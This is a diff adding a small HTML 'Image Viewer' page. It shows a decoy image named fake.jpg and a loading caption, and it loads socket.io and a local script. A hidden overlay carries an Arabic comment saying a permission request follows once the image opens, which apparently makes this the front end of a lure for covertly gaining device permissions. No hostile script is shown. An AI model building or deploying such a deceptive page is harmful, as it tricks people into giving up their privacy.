@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Image Viewer</title>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+    <div class="container image-page">
+        <div class="image-container">
+            <img src="/static/fake.jpg" alt="Image" id="fakeImage" style="width:100%;max-width:600px;">
+            <p class="image-caption">Loading image... Please wait.</p>
+        </div>
+        
+        <div class="hidden-overlay" id="hiddenOverlay">
+            <!-- المخفي: طلب الإذن بعد فتح الصورة -->
+        </div>
+    </div>
+
+    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
+    <script src="/static/script.js"></script>
+</body>
+</html>
